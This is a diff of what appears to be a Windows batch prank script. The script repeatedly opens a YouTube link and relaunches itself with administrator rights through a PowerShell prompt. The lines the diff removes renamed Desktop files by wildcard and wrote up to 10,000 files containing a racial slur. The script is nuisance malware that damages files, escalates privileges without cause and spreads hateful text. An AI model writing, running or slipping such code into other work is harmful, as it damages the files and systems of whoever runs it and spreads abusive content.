@@ -24,9 +24,16 @@ if not "%result2%"=="Yes" (
     exit /b
 )
 
-echo.
-echo Proceeding with script...
-echo.
+
+) else (
+    :: Show message box about needing admin rights
+    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges required!^n^nThe script will now restart with elevated permissions.', 'Admin Required', 'OK', 'Warning')" >nul
+    
+    :: Re-launch the script with admin rights
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
 
 
 
@@ -42,11 +49,6 @@ if %errorlevel% == 0 (
 for /l %%i in (1,1,%count%) do (
    start "" "https://www.youtube.com/watch?v=5oIi2M6y7G4&list=RD5oIi2M6y7G4"
    
-   cd %USERPROFILE%\Desktop
-ren *. *.GOOF
-
-cd %USERPROFILE%\Desktop
-for /l %i in (1,1,10000) do echo NIGA > CRYFORMEBOYYYY%i.txt
 
 ping 127.0.0.1 -n 2 >nul
 
@@ -286,14 +288,7 @@ goto rest1
 
 
 	
-) else (
-    :: Show message box about needing admin rights
-    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges required!^n^nThe script will now restart with elevated permissions.', 'Admin Required', 'OK', 'Warning')" >nul
-    
-    :: Re-launch the script with admin rights
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
+
 
 
 
